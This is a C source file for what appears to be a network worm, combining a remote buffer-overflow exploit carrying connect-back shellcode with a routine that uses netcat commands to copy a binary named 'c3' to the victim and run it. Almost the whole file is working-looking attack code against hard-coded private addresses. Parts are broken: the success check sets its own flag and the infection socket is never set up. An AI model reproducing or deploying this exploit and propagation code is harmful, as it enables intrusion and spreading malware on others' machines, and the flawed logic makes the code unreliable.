#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>

#define BUFFER_SIZE 1024
#define NAME_SIZE 2048
#define BUF_SIZE 1064

char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
                   "\x06\x51\xb1\x01\x51\xb1\x02\x51"
                   "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
                   "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
                   "\xB9\x11\x11\x11\x11\x81\xF1\x1B\x40\x11\x17\x51\x31\xC9\x66\x68\x11\x5c"
                   "\xb1\x02\x66\x51\x89\xe7\xb3"
                   "\x10\x53\x57\x52\x89\xe1\xb3\x03"
                   "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
                   "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
                   "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
                   "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
                   "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
                   "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
                   "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
                   "\x2f\x62\x69\x89\xe3\x50\x53\x89"
                   "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
                   "\x01\xcd\x80";

// standard offset (probably must be modified)
#define RET 0xbffff28b

// function to check if exploit succeeded
int Check_action()
{
    char *value_check = NULL;
    value_check = (char *)getenv("SUCCESS");
    if (value_check != NULL && (int)value_check[0] == 'Y')
    {
        return 1;
    }
    return 0;
}

// exploit function to send buffer to victim
int Exploit(char *ip_victim, unsigned int port_victim, char *callback_ip, unsigned int callback_port)
{
    // declare variables
    char buffer[BUF_SIZE];
    int s, i, size;
    struct hostent *host;
    struct sockaddr_in remote;

    /*if (argc != 3) {
        printf("Usage: %s target-ip port \n", argv[0]);
        return -1;
    }*/

    // filling buffer with NOPs
    memset(buffer, 0x90, BUF_SIZE);

    // Modify the connectback ip address and port. In this case, the shellcode connects to 192.168.2.101 on port 17*256+92=4444
    // shellcode[33] = 10;
    // shellcode[34] = 81;
    // shellcode[35] = 0;
    // shellcode[36] = 6;

    // shellcode[39] = 17;
    // shellcode[40] = 92;

    // copying shellcode into buffer
    memcpy(buffer + 900 - sizeof(shellcode), shellcode, sizeof(shellcode) - 1);

    // Copying the return address multiple times at the end of the buffer...
    for (i = 901; i < BUF_SIZE - 4; i += 4)
    {
        *((int *)&buffer[i]) = RET;
    }
    buffer[BUF_SIZE - 1] = 0x0;

    // creating socket...
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
    {
        fprintf(stderr, "Error: Socket\n");
        return -1;
    }

    // create remote
    // state Protocolfamily , then converting the hostname or IP address, and getting  port number
    remote.sin_family = AF_INET;
    // remote.sin_addr = *((struct in_addr*)host->h_addr);
    // remote.sin_port = htons(atoi(argv[2]));
    inet_aton(ip_victim, &remote.sin_addr.s_addr);
    remote.sin_port = htons(port_victim);

    // connecting with destination host
    if (connect(s, (struct sockaddr *)&remote, sizeof(remote)) == -1)
    {
        close(s);
        fprintf(stderr, "Error: connect\n");
        return -1;
    }
    // sending exploit string
    size = send(s, buffer, sizeof(buffer), 0);
    if (size == -1)
    {
        close(s);
        fprintf(stderr, "sending data failed\n");
        return -1;
    }

    // checking if exploit succeeded
    putenv("SUCCESS=Y");
    if (Check_action())
    {
        // announce success
        printf("Exploit succeeded!\n");
        return 1;
    }
    else
    {
        // announce failure
        printf("Exploit failed!\n");
        return 0;
    }

    // closing socket
    close(s);
    return 0;
}

// infecting function to send buffer to victim
void *Infect(void *arg)
{

    // declare variables
    int sock, check, client_size, bytes, i;
    struct sockaddr_in server, client;
    char buffer[BUF_SIZE];

    // announce infection
    printf("Infecting...\n");

    // creating socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        perror("Error: Socket\n");
        return;
    }

    // server settings
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);

    // infection anouncement
    printf("Infection\n");

    // sending shellcode
    memcpy(buffer, "pwd\x0A", 4);
    bytes = send(check, buffer, 4, 0);
    if (bytes < 0)
    {
        return;
    }
    buffer[bytes - 1] = 0;

    // get into dir
    printf("get into dir\n");

    // send worm
    memcpy(buffer, "nc -l 10001 > c3\x0A", 18);
    bytes = send(check, buffer, 18, 0);
    printf("Sending worm...\n");
    sleep(10);

    // send worm
    system("nc 10.81.0.8 10001 < c3");
    memcpy(buffer, "./c3\x0A", 5);
    bytes = send(check, buffer, 5, 0);
    if (bytes < 0)
    {
        return;
    }

    // closing socket
    close(sock);
}

int main(int argc, char *argv[])
{
    // declare variables
    pthread_t thread;
    int independent = 0;
    char callback_ip[16];

    // generate the independent thread
    independent = pthread_create(&thread, NULL, Infect, NULL);

    for (;;)
    {
        // announce exploit
        printf("Starting exploit...\n");

        // exploit
        if (Exploit("10.81.0.8", 5000, "10.81.0.6", 4444) == 1)
        {
            // announce success
            printf("Exploit succeeded!\n");
            pthread_join(thread, NULL);
            independent = pthread_create(&thread, NULL, Infect, NULL);
        }
        else
        {   
            // announce failure
            printf("Exploit failed!\n");
        }
        getchar();
        return 0;
    }
}